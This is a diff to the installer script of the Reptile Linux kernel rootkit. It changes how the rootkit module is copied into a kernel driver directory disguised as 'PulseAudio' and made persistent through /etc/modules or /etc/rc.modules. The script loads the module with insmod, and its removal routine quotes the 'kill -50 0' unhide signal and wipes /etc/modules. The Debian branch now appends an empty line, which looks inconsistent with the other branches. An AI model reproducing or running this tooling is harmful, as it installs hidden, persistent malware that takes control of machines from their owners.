@@ -6,7 +6,7 @@
 MODULE="rep_mod"
 DRIVER="PulseAudio"
 KERNEL_VERSION=$(uname -r)
-DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
+DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/reptile"
 PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"
 
 function usage {
@@ -24,7 +24,7 @@ function reptile_init {
 	echo -e "\n\e[00;31m############################################################################\e[00m"
 	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
 	echo -e "\e[00;31m############################################################################\e[00m"
-	echo -e "\e[00;36mwriten by: F0rb1dd3n\e[00m\n"
+	echo -e "\e[00;36mwriten by: F0rb1dd3n\e[00m"
 	
 	[ $(uname) != "Linux" ] && {
 		echo "Not on a Linux system. Exiting..."
@@ -62,6 +62,7 @@ function reptile_build {
 }
 
 function reptile_install {
+	reptile_init
     	reptile_build
 
 	echo -e "\n\e[00;31m############################################################################\e[00m\n" 
@@ -81,11 +82,11 @@ function reptile_install {
 	}
 
     	echo -ne "\nInstalling... "
-    	
-	cp "/reptile/$MODULE.ko" "$DRIVER_DIRECTORY" || echo -e "\e[01;31mERROR!\e[00m\n" 
+    
+	cp "/reptile/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
-        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules
+        	echo -e "" >> /etc/modules
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
         	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/rc.modules
         	chmod +x /etc/rc.modules
@@ -93,7 +94,7 @@ function reptile_install {
         	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules
     	fi
     	
-	depmod && insmod /reptile/$MODULE.ko && echo -e "\e[01;36mDONE!\e[00m\n\n" || { echo -e "\e[01;31mERROR!\e[00m\n\n"; exit; }
+	depmod && insmod /reptile/$MODULE.ko && echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 
 	read -p "Would you like to remove this directory ($PWD) on exit? (YES/NO) (case-sensitive) [NO]: "
 	if [ -z $REPLY ]; then
@@ -106,19 +107,19 @@ function reptile_install {
     		echo "Invalid option. Not removing."
 	fi
 
-	echo -e "Instalation has finished!\n"
+	echo -e "\nInstalation has finished!\n"
 }
 
 function reptile_remove {
 	echo -e "\n\e[01;31mBe sure to unhide and unload the module or this script will not work properly!\e[00m"
-	echo -e "Command: \e[01;32mkill -50 0 && rmmod reptile_mod\e[00m\n"
+	echo -e "Command: \e[01;32mkill -50 0 && rmmod rep_mod\e[00m\n"
     	echo -ne "Uninstalling... "
 	#kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'`
 	rm -rf /reptile
 	rm -rf $DRIVER_DIRECTORY
 	rm -rf /etc/rc.modules
 	echo '' > /etc/modules
-	depmod && echo -e "\e[01;36mDONE!\e[00m\n\n" || echo -e "\e[01;31mERROR!\e[00m\n\n"
+	depmod && echo -e "\e[01;36mDONE!\e[00m\n" || echo -e "\e[01;31mERROR!\e[00m\n"
 }
 
 case $1 in
